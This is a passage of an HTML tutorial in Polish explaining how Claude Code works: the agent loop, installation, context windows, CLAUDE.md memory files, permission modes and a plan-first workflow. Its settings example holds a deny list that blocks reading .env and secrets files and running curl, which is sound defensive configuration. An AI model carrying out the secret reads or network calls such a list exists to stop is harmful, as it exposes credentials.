+  <p class="reveal">To nie jest lista funkcji Claude Code. Dokumentacja już to ma, i zmienia się co tydzień.
+  Ten przewodnik jest o <em>mechanizmach</em>: dlaczego Claude czyta pięć plików, zanim edytuje jeden, dlaczego długa sesja
+  robi się gorsza, dlaczego reguła w <code>CLAUDE.md</code> jest prośbą, a hook — gwarancją. Kiedy rozumiesz mechanizm,
+  każda nowa funkcja to po prostu nowe pokrętło w maszynie, którą już znasz.</p>
+
+  <p class="reveal">Droga od zera do eksperta ma cztery etapy. Rozdziały 1–3 budują model mentalny (pętla, terminal,
+  kontekst). Rozdziały 4–8 to codzienne umiejętności (pamięć, uprawnienia, planowanie, prompting, cofanie). Rozdziały
+  9–12 to warstwa rozszerzeń (skille, subagenci, hooki, MCP, pluginy). Rozdziały 13–16 to warstwa eksperta
+  (sesje równoległe, CI, wybór modelu, nawyki). Każdy rozdział ma jeden interaktywny rysunek: klikaj przyciski, psuj
+  rzeczy, naciśnij <b>↺ Reset</b>.</p>
+
+  <div class="box brain reveal"><span class="lbl">🧠 Mózg na wysokich obrotach</span>
+    <p>Zanim zaczniesz: gdybyś musiał zaprojektować AI, która edytuje prawdziwe repozytorium, czym martwiłbyś się
+    najbardziej? Złymi edycjami? Skasowanymi plikami? Zapominaniem, co robiła? Rosnącym rachunkiem? Zapisz swoją listę.
+    Do rozdziału 16 każdy jej punkt będzie miał nazwaną funkcję, która istnieje właśnie po to.</p>
+  </div>
+
+  <div class="box relax reveal"><span class="lbl">😌 Rozluźnij się</span>
+    <p>Nie musisz zapamiętywać komend. Wpisz <code>/</code> w Claude Code, a pojawi się pełne menu; naciśnij
+    <code>?</code> przy pustym prompcie, by zobaczyć skróty. Zapamiętaj <em>idee</em> — menu przypomni Ci nazwy.
+    Fakty tutaj sprawdzono z oficjalną dokumentacją na <code>code.claude.com/docs</code> we wrześniu 2026; Claude
+    Code często wydaje nowe wersje, więc uruchom <code>/release-notes</code>, gdy coś wygląda inaczej.</p>
+  </div>
+</section>
+
+<!-- ============================ 1 ============================ -->
+<section class="chapter" id="loop">
+  <div class="chap-head reveal"><div class="chap-num">1</div><div><h2>Pętla agenta</h2><span class="tag">to nie autouzupełnianie — to pracownik z rękami</span></div></div>
+
+  <p class="reveal">Model czatu odpowiada. <b>Agent</b> działa. Claude Code owija model Claude w pętlę z narzędziami:
+  model czyta Twoją prośbę, decyduje, które narzędzie wywołać (przeczytać plik, grep, edytować, uruchomić polecenie shell, pobrać URL),
+  widzi wynik i decyduje ponownie. Powtarza, aż uzna zadanie za skończone — albo aż go przerwiesz.</p>
+
+  <p class="reveal">Dokumentacja opisuje trzy fazy, które przenikają się nawzajem: <b>zbierz kontekst</b>, <b>podejmij działanie</b>,
+  <b>zweryfikuj wyniki</b>. Najważniejsze zdanie w całym tym przewodniku wynika właśnie z tej pętli:
+  <em>Claude jest tak dobry, jak dobra jest jego zdolność do sprawdzenia własnej pracy.</em> Jeśli istnieje test, build, linter albo
+  zrzut ekranu, na który może spojrzeć, pętla zamyka się sama. Jeśli nie — <em>Ty</em> jesteś krokiem weryfikacji.</p>
+
+  <figure class="fig wide" id="fig-loop">
+    <div class="ftitle">▶ Pętla na żywo <span>zadanie: „test logowania nie przechodzi — napraw go”</span></div>
+    <div class="ctrl">
+      <button class="btn primary" data-act="run">▶ Uruchom zadanie</button>
+      <button class="btn" data-act="noverify">✂ Usuń testy</button>
+      <button class="btn" data-act="esc">✋ Esc — steruj w trakcie</button>
+      <button class="btn" data-act="reset">↺ Reset</button>
+    </div>
+    <div class="two">
+      <svg viewBox="0 0 420 330" id="loop-svg"></svg>
+      <div class="loop-side">
+        <div class="ctr"><div>wywołania narzędzi<b id="loop-calls">0</b></div><div>tury modelu<b id="loop-turns">0</b></div><div>wynik<b id="loop-res">—</b></div></div>
+        <div class="log" id="loop-log"></div>
+      </div>
+    </div>
+    <div class="status" id="loop-status">Naciśnij ▶, by zobaczyć, jak Claude zbiera, działa i weryfikuje.</div>
+    <figcaption>Uproszczone: prawdziwe uruchomienie może grupować kilka wywołań tylko do odczytu równolegle i streamować rozumowanie. Nazwy
+      narzędzi są prawdziwe (Grep, Read, Edit, Bash).</figcaption>
+  </figure>
+
+  <div class="box nodumb reveal"><span class="lbl">❓ Nie istnieją głupie pytania</span>
+    <div class="qa">
+      <div class="q">P:</div><div>Dlaczego czytał pliki przed edycją? Powiedziałem mu, który test nie przechodzi.</div>
+      <div class="a">O:</div><div>Bo model zaczyna każdą sesję, nie wiedząc niczego o Twoim kodzie. Nie ma w głowie
+        indeksu Twojego repozytorium. Wszystko, co wie, pochodzi z tego, co przeczytał w <em>tej</em> sesji, plus
+        <code>CLAUDE.md</code> i automatyczna pamięć (rozdział 4). Czytanie najpierw to prawidłowe zachowanie — możesz je przyspieszyć,
+        wskazując pliki przez <code>@ścieżka</code>.</div>
+      <div class="q">P:</div><div>Czy mogę pisać, kiedy pracuje?</div>
+      <div class="a">O:</div><div>Tak. Wiadomości wpisane w trakcie tury trafiają do kolejki i Claude czyta je w kolejnym kroku.
+        Naciśnij <kbd>Esc</kbd>, by natychmiast zatrzymać bieżący krok; dotychczasowa praca zostaje, a Ty możesz skierować dalej.</div>
+    </div>
+  </div>
+
+  <div class="box bullets reveal"><span class="lbl">📌 Celne spostrzeżenia</span>
+    <ul>
+      <li>Claude Code = model + narzędzia + pętla: zbierz kontekst → działaj → zweryfikuj → powtórz.</li>
+      <li>Poza CLAUDE.md i automatyczną pamięcią, na starcie nie wie nic o Twoim repozytorium; czytanie nie jest stratą czasu.</li>
+      <li>Daj mu sposób weryfikacji (testy, build, zrzuty ekranu). Brak weryfikacji ⇒ wiarygodnie wyglądające błędy.</li>
+      <li><kbd>Esc</kbd> przerywa, pisanie w trakcie tury dodaje korektę do kolejki. Steruj wcześnie.</li>
+    </ul>
+  </div>
+</section>
+
+<!-- ============================ 2 ============================ -->
+<section class="chapter" id="term">
+  <div class="chap-head reveal"><div class="chap-num">2</div><div><h2>Twoja pierwsza sesja</h2><span class="tag">instalacja, interfejsy i pięć magicznych prefiksów</span></div></div>
+
+  <p class="reveal">Zainstaluj natywnym instalatorem i uruchom wewnątrz katalogu projektu:</p>
+  <pre class="reveal"><code># macOS, Linux, WSL
+curl -fsSL https://claude.ai/install.sh | bash
+# Windows PowerShell
+irm https://claude.ai/install.ps1 | iex
+
+cd my-project
+claude            # sesja interaktywna
+claude "explain the auth flow"   # start z promptem
+claude -c         # kontynuuj najnowszą rozmowę w tym katalogu
+claude -r         # wybierz starszą sesję do wznowienia</code></pre>
+
+  <p class="reveal">Ten sam silnik działa w kilku <b>interfejsach</b>: CLI w terminalu, rozszerzenia VS Code i JetBrains,
+  aplikacja Desktop, web pod <code>claude.ai/code</code> (sesje w chmurze, w piaskownicy), aplikacja mobilna i Slack. Dzielą
+  pliki <code>CLAUDE.md</code> Twojego repozytorium, ustawienia i serwery MCP. Z subskrypcją claude.ai możesz przenosić sesję między nimi: <code>/desktop</code> przekazuje
+  sesję z terminala do aplikacji Desktop, <code>--teleport</code> ściąga sesję z chmury do terminala, a
+  <code>/remote-control</code> pozwala sterować lokalną sesją z telefonu.</p>
+
+  <p class="reveal">Wewnątrz prompta kilka znaków zmienia to, co wpisujesz, w coś innego. Naucz się ich, a
+  już używasz Claude Code lepiej niż większość ludzi:</p>
+
+  <figure class="fig wide" id="fig-term">
+    <div class="ftitle">▶ Fałszywy terminal <span>kliknij klawisz, by zobaczyć, co robi</span></div>
+    <div class="ctrl">
+      <button class="btn" data-act="slash"><code>/</code> komenda</button>
+      <button class="btn" data-act="at"><code>@</code> plik</button>
+      <button class="btn" data-act="bang"><code>!</code> shell</button>
+      <button class="btn" data-act="tab"><kbd>Shift+Tab</kbd> tryb</button>
+      <button class="btn" data-act="btw"><code>/btw</code> pytanie z boku</button>
+      <button class="btn" data-act="escesc"><kbd>Esc Esc</kbd> cofnij</button>
+      <button class="btn" data-act="reset">↺ Reset</button>
+    </div>
+    <div class="term" id="term-box">
+      <div class="out" id="term-out"></div>
+      <div class="inp"><span id="term-inp"></span><span class="cur"></span></div>
+      <div class="bar"><span>? — skróty</span><span class="mode" id="term-mode">⏸ tryb ręczny włączony</span></div>
+    </div>
+    <div class="status" id="term-status">Pasek prompta na dole pokazuje tryb uprawnień — patrz, jak się zmienia.</div>
+    <figcaption>Wynik jest skrócony. W prawdziwej sesji <code>/</code> pokazuje każdą wbudowaną komendę, dołączoną skillę i
+      Twoje własne skille, filtrowane w miarę pisania.</figcaption>
+  </figure>
+
+  <div class="scroll-x reveal">
+  <table class="mini">
+    <thead><tr><th>Klawisz</th><th>Co robi</th><th>Kiedy używać</th></tr></thead>
+    <tbody>
+      <tr><td><kbd>Esc</kbd></td><td>Przerywa bieżący krok</td><td>Claude idzie w złą stronę. Rób to wcześnie.</td></tr>
+      <tr><td><kbd>Esc</kbd> <kbd>Esc</kbd></td><td>Czyści szkic albo przy pustym polu otwiera menu cofania</td><td>Cofnięcie kilku ostatnich promptów (rozdział 8)</td></tr>
+      <tr><td><kbd>Shift+Tab</kbd></td><td>Przełącza tryby uprawnień</td><td>Przejście do plan mode albo accept-edits (rozdział 5)</td></tr>
+      <tr><td><kbd>Ctrl+G</kbd></td><td>Otwiera prompt (lub plan) w Twoim edytorze</td><td>Długie prompty, edycja planu</td></tr>
+      <tr><td><kbd>Ctrl+B</kbd></td><td>Wysyła działające zadania w tło</td><td>Długi build/test, na który nie chcesz czekać</td></tr>
+      <tr><td><kbd>Ctrl+O</kbd></td><td>Podgląd transkrypcji</td><td>Zobacz każde wywołanie narzędzia szczegółowo</td></tr>
+      <tr><td><kbd>Ctrl+T</kbd></td><td>Przełącza listę zadań Claude</td><td>Śledzenie postępu wieloetapowej pracy</td></tr>
+      <tr><td><kbd>Ctrl+V</kbd></td><td>Wkleja obraz</td><td>Zrzuty ekranu błędów, makiety do wdrożenia</td></tr>
+      <tr><td><kbd>Option/Alt+P</kbd> · <kbd>+T</kbd> · <kbd>+O</kbd></td><td>Zmiana modelu · przełącznik myślenia · przełącznik trybu fast</td><td>Rozdział 15</td></tr>
+    </tbody>
+  </table>
+  </div>
+
+  <div class="box pencil reveal"><span class="lbl">✏️ Zaostrz ołówek</span>
+    <p>Chcesz, by Claude spojrzał na wynik <code>git log --oneline -20</code> i podsumował, co zmieniło się w tym tygodniu.
+    Jaki jest najszybszy sposób, który nie każe Claude prosić o zgodę na uruchomienie gita?</p>
+    <details><summary>Odpowiedź</summary><p>Wpisz <code>! git log --oneline -20</code>. Prefiks <code>!</code> uruchamia
+    polecenie samodzielnie, dodaje jego wynik do rozmowy, a Claude na niego odpowiada. Bez prośby o uprawnienia, bo
+    to <em>Ty</em> go uruchomiłeś.</p></details>
+  </div>
+
+  <div class="box bullets reveal"><span class="lbl">📌 Celne spostrzeżenia</span>
+    <ul>
+      <li><code>/</code> komendy i skille, <code>@</code> wzmianka pliku, <code>!</code> shell, <kbd>Esc</kbd> stop, <kbd>Esc Esc</kbd> cofnij, <kbd>Shift+Tab</kbd> tryb.</li>
+      <li><code>claude -c</code> kontynuuje, <code>claude -r</code> wznawia; nazywaj sesje przez <code>/rename</code> albo <code>-n</code>.</li>
+      <li>Jeden silnik, wiele interfejsów — sesje mogą przemieszczać się między terminalem, desktopem, webem i telefonem.</li>
+    </ul>
+  </div>
+</section>
+
+<!-- ============================ 3 ============================ -->
+<section class="chapter" id="ctx">
+  <div class="chap-head reveal"><div class="chap-num">3</div><div><h2>Okno kontekstu</h2><span class="tag">jedyny zasób, którym musisz zarządzać</span></div></div>
+
+  <p class="reveal">Wszystko, co Claude „wie” w sesji, żyje w jego <b>oknie kontekstu</b>: prompt systemowy, definicje
+  narzędzi, Twój <code>CLAUDE.md</code>, opisy skilli, każda wiadomość, każdy przeczytany plik, każdy wynik polecenia.
+  Okno ma stały rozmiar. Gdy się zapełni, Claude Code <b>kompaktuje</b>: zastępuje starszą historię podsumowaniem.
+  Szczegóły giną w podsumowaniach.</p>
+
+  <p class="reveal">A jest cichszy problem, zanim okno się zapełni: <b>szum</b>. Im więcej nieistotnych rzeczy siedzi
+  w kontekście — dygresja z debugowania, trzy niepowiązane pytania, 2000-liniowy log — tym gorzej Claude trzyma się
+  Twoich instrukcji. Doświadczeni użytkownicy traktują kontekst jak RAM w małej maszynie.</p>
+
+  <figure class="fig wide" id="fig-ctx">
+    <div class="ftitle">▶ Zapełnij okno <span>a potem posprzątaj</span></div>
+    <div class="ctrl">
+      <button class="btn" data-act="read">📄 Przeczytaj 3 duże pliki</button>
+      <button class="btn" data-act="tangent">💬 Niepowiązane pytanie</button>
+      <button class="btn" data-act="sub">🕵️ Deleguj szukanie do subagenta</button>
+      <button class="btn" data-act="btw">/btw szybkie pytanie</button>
+      <button class="btn primary" data-act="compact">/compact</button>
+      <button class="btn bad" data-act="clear">/clear</button>
+      <button class="btn" data-act="reset">↺ Reset</button>
+    </div>
+    <div class="ctx-wrap">
+      <div class="ctx-row"><b>Sesja główna</b><div class="ctx-bar" id="ctx-main"></div></div>
+      <div class="ctx-row"><span class="mut">Subagent</span><div class="ctx-bar sub" id="ctx-sub"></div></div>
+      <div class="ctx-row"><span class="mut">Użyte</span><div><span class="ctx-num" id="ctx-num">0</span> <span class="mut">/ 200K tokenów</span> · <span class="mut">szum:</span> <span class="ctx-num" id="ctx-noise">0%</span> <span id="ctx-bubble"></span></div></div>
+    </div>
+    <div class="legend"><span style="--c:#6b7280">system + narzędzia</span><span style="--c:#1b6fa8">CLAUDE.md + skille</span><span style="--c:#2f9e63">praca nad zadaniem</span><span style="--c:#c98a00">szum</span><span style="--c:#8e44ad">podsumowanie</span></div>
+    <div class="status" id="ctx-status">Świeża sesja już zużywa część kontekstu na prompt systemowy, narzędzia i CLAUDE.md.</div>
+    <figcaption>Liczby są poglądowe. Prawdziwe okno zależy od modelu (200K jest typowe; niektóre modele oferują 1M).
+      <code>/context</code> pokazuje Twoje realne zużycie jako kolorową siatkę; <code>/autocompact</code> ustawia, kiedy zaczyna się automatyczna kompaktacja.</figcaption>
+  </figure>
+
+  <div class="box fireside reveal"><span class="lbl">🔥 Pogawędka przy kominku</span>
+    <p class="mut">Dzisiejsi goście: <b>/compact</b> i <b>/clear</b>.</p>
+    <div class="fire">
+      <div class="line l1"><div class="who">/compact</div><div>Jestem ten łagodny. Podsumowuję rozmowę i jadę dalej. Możesz mną sterować: <code>/compact focus on the API changes</code>.</div></div>
+      <div class="line l2"><div class="who">/clear</div><div>A ja jestem ta szczera. Podsumowanie i tak niesie martwe tropy i błędne domysły. Nowe zadanie? Zacznij czysto.</div></div>
+      <div class="line l1"><div class="who">/compact</div><div>Ale wtedy Claude zapomina, co ustaliliśmy!</div></div>
+      <div class="line l2"><div class="who">/clear</div><div>Decyzje należą do plików — planu, linijki w <code>CLAUDE.md</code>, komunikatu commita. Nie do historii czatu. Wtedy czyszczenie nic nie kosztuje.</div></div>
+    </div>
+  </div>
+
+  <div class="box geek reveal"><span class="lbl">🤓 Dla dociekliwych</span>
+    <p>Nie każdy kontekst jest równy. Narzędzia MCP ładują na starcie tylko swoje <em>nazwy</em>; pełne schematy są pobierane przy użyciu
+    (tool search). Skille ładują tylko swoje <em>opisy</em>; treść ładuje się przy wyzwoleniu. Subagenci działają w
+    <em>swoim</em> oknie i zwracają tylko podsumowanie. Hooki nic nie kosztują, chyba że coś wypisują. Dlatego rozdziały o rozszerzeniach wciąż
+    pytają „gdzie to ląduje w kontekście?” — to zasada projektowa stojąca za nimi wszystkimi.
+    Dla częściowej kompaktacji otwórz menu cofania (<kbd>Esc Esc</kbd>), wybierz wiadomość i wybierz
+    <b>Podsumuj od tego miejsca</b> albo <b>Podsumuj do tego miejsca</b>.</p>
+  </div>
+
+  <div class="box bullets reveal"><span class="lbl">📌 Celne spostrzeżenia</span>
+    <ul>
+      <li>Kontekst jest skończony, a szum szkodzi, zanim się zapełni. <code>/context</code>, by zobaczyć, <code>/clear</code> między niepowiązanymi zadaniami.</li>
+      <li><code>/compact [focus]</code> jedzie dalej z podsumowaniem; <code>/btw</code> pyta bez dodawania do historii.</li>
+      <li>Duże wyszukiwania → subagenci: ich czytanie zostaje w ich oknie.</li>
+      <li>Utrwalaj decyzje w plikach, nie w czacie.</li>
+    </ul>
+  </div>
+</section>
+
+<!-- ============================ 4 ============================ -->
+<section class="chapter" id="mem">
+  <div class="chap-head reveal"><div class="chap-num">4</div><div><h2>Pamięć: CLAUDE.md, reguły, automatyczna pamięć</h2><span class="tag">jak Claude pamięta Twój projekt między sesjami</span></div></div>
+
+  <p class="reveal">Każda sesja zaczyna się od zera — poza plikami, które Claude Code ładuje automatycznie. Głównym z nich jest
+  <code>CLAUDE.md</code>: zwykły markdown z komendami buildu, konwencjami i regułami „nigdy nie rób X”. Uruchom
+  <code>/init</code> raz, a Claude napisze pierwszą wersję, czytając Twoje repozytorium. Jest kilka poziomów i one się
+  <b>sumują</b> (nie nadpisują się nawzajem):</p>
+
+  <div class="scroll-x reveal">
+  <table class="mini">
+    <thead><tr><th>Poziom</th><th>Lokalizacja</th><th>Do czego</th></tr></thead>
+    <tbody>
+      <tr><td>Polityka zarządzana</td><td><code>/Library/Application Support/ClaudeCode/CLAUDE.md</code> (macOS), <code>/etc/claude-code/CLAUDE.md</code> (Linux)</td><td>Reguły firmowe ustawione przez IT</td></tr>
+      <tr><td>Użytkownik</td><td><code>~/.claude/CLAUDE.md</code></td><td>Twoje osobiste preferencje, wszystkie projekty</td></tr>
+      <tr><td>Projekt</td><td><code>./CLAUDE.md</code> albo <code>./.claude/CLAUDE.md</code></td><td>Konwencje zespołu — commituj to</td></tr>
+      <tr><td>Lokalny</td><td><code>./CLAUDE.local.md</code></td><td>Twoje prywatne notatki dla tego repo — dodaj do gitignore</td></tr>
+      <tr><td>Zagnieżdżony</td><td><code>packages/web/CLAUDE.md</code></td><td>Ładowany leniwie, gdy Claude czyta pliki w tym folderze</td></tr>
+      <tr><td>Reguły</td><td><code>.claude/rules/*.md</code> z globami <code>paths:</code></td><td>Ładują się tylko przy dotknięciu pasujących plików</td></tr>
+      <tr><td>Automatyczna pamięć</td><td>zapisywana przez Claude per repo (indeks <code>MEMORY.md</code>)</td><td>Korekty i preferencje, których Claude się nauczył; pierwsze 200 linii / 25KB ładuje się co sesję</td></tr>
+    </tbody>
+  </table>
+  </div>
+
+  <figure class="fig wide" id="fig-mem">
+    <div class="ftitle">▶ Co się ładuje i kiedy <span>sesja w monorepo</span></div>
+    <div class="ctrl">
+      <button class="btn primary" data-act="start">▶ Start sesji w repo/</button>
+      <button class="btn" data-act="web">Claude czyta packages/web/App.tsx</button>
+      <button class="btn" data-act="api">Claude edytuje src/api/users.ts</button>
+      <button class="btn bad" data-act="bloat">📈 Rozdmuchaj CLAUDE.md do 900 linii</button>
+      <button class="btn" data-act="reset">↺ Reset</button>
+    </div>
+    <div class="two">
+      <div class="tree" id="mem-tree"></div>
+      <div>
+        <div class="loaded" id="mem-loaded"></div>
+        <div style="margin-top:.6rem;font:12.5px var(--sans)">Posłuszeństwo instrukcjom <span class="mut">(poglądowe)</span></div>
+        <div class="meter"><i id="mem-meter"></i></div>
+      </div>
+    </div>
+    <div class="status" id="mem-status">Nic nie jest załadowane przed startem sesji.</div>
+    <figcaption>Miernik posłuszeństwa to narzędzie dydaktyczne, nie pomiar. Wskazówka z dokumentacji za nim jest prawdziwa: trzymaj
+      każdy CLAUDE.md poniżej ~200 linii; dłuższe pliki zużywają więcej kontekstu i obniżają posłuszeństwo.</figcaption>
+  </figure>
+
+  <p class="reveal">Co powinno trafić do dobrego projektowego <code>CLAUDE.md</code>? Tylko to, czego Claude nie może się domyślić i czego będzie potrzebować w większości
+  sesji:</p>
+<pre class="reveal"><code># Build i testy
+- `pnpm dev` uruchamia aplikację, `pnpm test -- path/to/file` uruchamia jeden plik testowy
+- Zawsze uruchom `pnpm typecheck` po zmianie typów
+
+# Konwencje
+- Używaj pnpm, nigdy npm. Tylko moduły ES.
+- Handlery API mieszkają w src/api/, jeden plik na zasób. Zobacz @docs/api-style.md
+
+# Pułapki
+- Folder `legacy/` jest zamrożony. Nigdy go nie edytuj.
+- Przy kompaktacji zachowaj listę zmodyfikowanych plików i komendy testów.</code></pre>
+
+  <div class="box watch reveal"><span class="lbl">⚠️ Uwaga, pułapka</span>
+    <p><code>CLAUDE.md</code> to <b>rada</b>, nie egzekwowanie. „Nigdy nie edytuj <code>.env</code>” w CLAUDE.md zwykle działa;
+    reguła uprawnień <code>deny</code> (rozdział 5) albo hook <code>PreToolUse</code> (rozdział 11) działa <em>zawsze</em>.
+    Jeśli reguła musi obowiązywać za każdym razem, nie zapisuj jej jako prozy.</p>
+  </div>
+
+  <div class="box nodumb reveal"><span class="lbl">❓ Nie istnieją głupie pytania</span>
+    <div class="qa">
+      <div class="q">P:</div><div>Moje repozytorium ma już <code>AGENTS.md</code> dla innych narzędzi. Duplikować?</div>
+      <div class="a">O:</div><div>Nie. Claude Code może czytać <code>AGENTS.md</code> samodzielnie albo razem z CLAUDE.md, albo możesz
+        zaimportować go z CLAUDE.md przez <code>@AGENTS.md</code>. Importy działają ze ścieżkami względnymi i bezwzględnymi, do
+        czterech poziomów głębokości.</div>
+      <div class="q">P:</div><div>Jak zobaczyć albo edytować to, co jest załadowane?</div>
+      <div class="a">O:</div><div><code>/memory</code> wylicza załadowane pliki, otwiera je w Twoim edytorze i przełącza automatyczną
+        pamięć. <code>/context</code> pokazuje, ile tokenów kosztują.</div>
+    </div>
+  </div>
+
+  <div class="box bullets reveal"><span class="lbl">📌 Celne spostrzeżenia</span>
+    <ul>
+      <li>Poziomy się sumują: zarządzany + użytkownik + projekt + lokalny + zagnieżdżony + reguły + automatyczna pamięć.</li>
+      <li>Trzymaj każdy CLAUDE.md krótki (&lt;200 linii). Przenoś procedury do skilli, reguły specyficzne dla folderu do <code>.claude/rules/</code>.</li>
+      <li>Błąd, który Claude popełnia dwa razy → jedna linijka w CLAUDE.md. Reguła, która nigdy nie może się złamać → hook albo reguła deny.</li>
+    </ul>
+  </div>
+</section>
+
+<!-- ============================ 5 ============================ -->
+<section class="chapter" id="perm">
+  <div class="chap-head reveal"><div class="chap-num">5</div><div><h2>Uprawnienia i tryby</h2><span class="tag">ile luzu dać agentowi</span></div></div>
+
+  <p class="reveal">Każde wywołanie narzędzia przechodzi przez bramkę. Dwie rzeczy decydują o wyniku: Twoje <b>reguły uprawnień</b> (jawne
+  listy allow / ask / deny) i <b>tryb uprawnień</b> sesji (domyślne zachowanie dla wszystkiego, czego nie dotyczy żadna reguła).</p>
+
+  <div class="scroll-x reveal">
+  <table class="mini">
+    <thead><tr><th>Tryb</th><th>Działa bez pytania</th><th>Najlepszy do</th></tr></thead>
+    <tbody>
+      <tr><td><code>default</code> (ręczny)</td><td>Tylko odczyty</td><td>Wrażliwej pracy, uczenia się, co robi Claude</td></tr>
+      <tr><td><code>acceptEdits</code></td><td>Odczyty, edycje plików i typowe komendy systemu plików (<code>mkdir</code>, <code>touch</code>, <code>rm</code>, <code>rmdir</code>, <code>mv</code>, <code>cp</code>, <code>sed</code>) wewnątrz katalogów roboczych</td><td>Iterowania nad kodem, który przeglądasz w gicie</td></tr>
+      <tr><td><code>plan</code></td><td>Odczyty (tylko badanie, bez edycji)</td><td>Eksploracji i projektowania przed zmianą</td></tr>
+      <tr><td><code>auto</code></td><td>Wszystko, z klasyfikatorem bezpieczeństwa w tle</td><td>Długich zadań, mniejszego zmęczenia promptami</td></tr>
+      <tr><td><code>dontAsk</code></td><td>Odczyty i wcześniej zatwierdzone narzędzia; wszystko, co wymagałoby pytania, jest odmawiane</td><td>Zamkniętego CI i skryptów</td></tr>
+      <tr><td><code>bypassPermissions</code></td><td>Wszystko, bez sprawdzeń</td><td>Wyłącznie izolowanych kontenerów / VM</td></tr>
+    </tbody>
+  </table>
+  </div>
+
+  <p class="reveal"><kbd>Shift+Tab</kbd> przełącza <code>default → acceptEdits → plan</code>, a opcjonalne tryby, które włączyłeś,
+  wchodzą po planie. <code>dontAsk</code> nigdy nie jest w cyklu; uruchom go przez
+  <code>--permission-mode dontAsk</code>. Reguły żyją w <code>settings.json</code> pod <code>permissions</code> i są
+  sprawdzane w stałej kolejności: <b>deny, potem ask, potem allow</b>. Wygrywa pierwsze trafienie; specyficzność nie ma znaczenia.</p>
+
+  <figure class="fig wide" id="fig-perm">
+    <div class="ftitle">▶ Brama uprawnień <span>wybierz wywołanie narzędzia, wybierz tryb</span></div>
+    <div class="modes" id="perm-modes"></div>
+    <div class="ctrl">
+      <button class="btn" data-act="cycle"><kbd>Shift+Tab</kbd> przełącz tryb</button>
+      <button class="btn" data-act="reset">↺ Reset</button>
+    </div>
+    <div class="rules" id="perm-rules"></div>
+    <div class="calls" id="perm-calls"></div>
+    <div class="status" id="perm-status">Wybierz wywołanie narzędzia, by przepuścić je przez bramkę.</div>
+    <figcaption>Uproszczone: prawdziwy klasyfikator <code>auto</code> widzi Twoje wiadomości i działania Claude (nie wynik narzędzi), a zapisy do chronionych
+      ścieżek (jak <code>.git</code>) mają własne reguły. Składnia reguł jest prawdziwa — wypróbuj ją w <code>/permissions</code>.</figcaption>
+  </figure>
+
+<pre class="reveal"><code>// .claude/settings.json  (dzielone z zespołem — commituj to)
+{
+  "permissions": {
+    "allow": ["Bash(npm run *)", "Bash(git commit *)"],
+    "ask":   ["Bash(git push *)"],
+    "deny":  ["Read(./.env)", "Read(./secrets/**)", "Bash(curl *)"]
+  }
+}</code></pre>
+
+  <p class="reveal">Ustawienia też mają warstwy. Dla pojedynczego klucza <b>wyższa warstwa wygrywa</b> — ale klucze list, takie jak <code>permissions.allow</code> i <code>deny</code>, są <b>scalane</b>
+  między warstwami: polityka zarządzana &gt; flagi wiersza poleceń
+  (<code>--settings</code>) &gt; <code>.claude/settings.local.json</code> (Ty, ten projekt) &gt;
+  <code>.claude/settings.json</code> (zespół) &gt; <code>~/.claude/settings.json</code> (Ty, wszędzie). Nie wiesz,
+  gdzie należy klucz? Zapytaj: <code>/update-config allow npm test</code> — albo uruchom <code>/fewer-permission-prompts</code>,
+  które skanuje Twoją historię i proponuje listę allow bezpiecznych komend tylko do odczytu.</p>
+
+  <div class="box watch reveal"><span class="lbl">⚠️ Uwaga, pułapka</span>
+    <p>Reguła allow nie może wyciąć wyjątku z reguły deny. Przy <code>deny: Bash(aws *)</code>,
+    <code>allow: Bash(aws s3 ls)</code> nigdy się nie odpali. I stawiaj <code>*</code> po subkomendzie:
+    <code>Bash(git log *)</code> zezwala tylko na <code>git log …</code>; <code>Bash(git *)</code> zezwala też na <code>git push --force</code>.
+    <code>--dangerously-skip-permissions</code> należy do jednorazowego kontenera, nigdy do Twojego laptopa.</p>
+  </div>
+
+  <div class="box geek reveal"><span class="lbl">🤓 Dla dociekliwych</span>
+    <p>Dla mniejszej liczby pytań <em>i</em> prawdziwego bezpieczeństwa na Twojej maszynie wypróbuj <b>piaskownicę</b> Bash: <code>/sandbox</code> uruchamia
+    komendy shell z izolacją systemu plików i sieci na poziomie OS (macOS, Linux, WSL2), a jej tryb auto-allow pozwala
+    komendom w piaskownicy działać bez pytania. Piaskownica ogranicza, co komenda <em>może</em> zrobić; uprawnienia ograniczają, co
+    Claude <em>może próbować</em>. Obrona w głąb używa obu.</p>
+  </div>
+
+  <div class="box bullets reveal"><span class="lbl">📌 Celne spostrzeżenia</span>
+    <ul>
+      <li>Reguły: deny → ask → allow, wygrywa pierwsze trafienie. Tryb decyduje o wszystkim, czego żadna reguła nie dotyczyła.</li>
+      <li>Ucz się w <code>default</code>, iteruj w <code>acceptEdits</code>, projektuj w <code>plan</code>, jedź długo w <code>auto</code>, skryptuj w <code>dontAsk</code>.</li>
+      <li>Reguły zespołu w <code>.claude/settings.json</code>, osobiste w <code>settings.local.json</code>.</li>
+    </ul>
+  </div>
+</section>
+
+<!-- ============================ 6 ============================ -->
+<section class="chapter" id="plan">
+  <div class="chap-head reveal"><div class="chap-num">6</div><div><h2>Zbadaj → Zaplanuj → Koduj → Zweryfikuj</h2><span class="tag">przepływ pracy, który oszczędza najwięcej czasu</span></div></div>
+
+  <p class="reveal">Najczęstszy ruch początkującego to „zaimplementuj funkcję X” jako pierwszy prompt. Claude to zrobi — i
+  rozwiąże problem, który <em>zgadł</em>, nie ten, który masz. Zalecany przepływ pracy oddziela badanie
+  od wykonania:</p>
+  <ol class="reveal">
+    <li><b>Zbadaj</b> (plan mode): „przeczytaj <code>src/auth</code> i wyjaśnij, jak odświeżane są sesje.” Bez edycji.</li>
+    <li><b>Zaplanuj</b>: „zaplanuj, jak dodać logowanie przez Google. Które pliki się zmienią? Jaka jest migracja?” Naciśnij <kbd>Ctrl+G</kbd>, by
+      samodzielnie edytować plan w swoim edytorze. Zatwierdzenie planu wychodzi z plan mode.</li>
+    <li><b>Koduj</b>: Claude implementuje zgodnie z planem, odhaczając kolejne punkty.</li>
+    <li><b>Zweryfikuj i commituj</b>: testy, typecheck, rzut oka na <code>/diff</code>, potem „commituj z jasnym komunikatem i otwórz PR”.</li>
+  </ol>
+
+  <figure class="fig wide" id="fig-plan">
+    <div class="ftitle">▶ Wyścig: prosto do kodu vs najpierw plan <span>to samo zadanie, dwa podejścia</span></div>
+    <div class="ctrl">
+      <label>Rozmiar zadania
+        <select id="plan-size" aria-label="rozmiar zadania">
+          <option value="small">jednolinijkowa poprawka literówki</option>
+          <option value="mid">nowy endpoint API (3 pliki)</option>
+          <option value="big" selected>refaktor auth (15 plików)</option>
+        </select></label>
+      <button class="btn primary" data-act="race">▶ Wyścig</button>
+      <button class="btn" data-act="reset">↺ Reset</button>
+    </div>
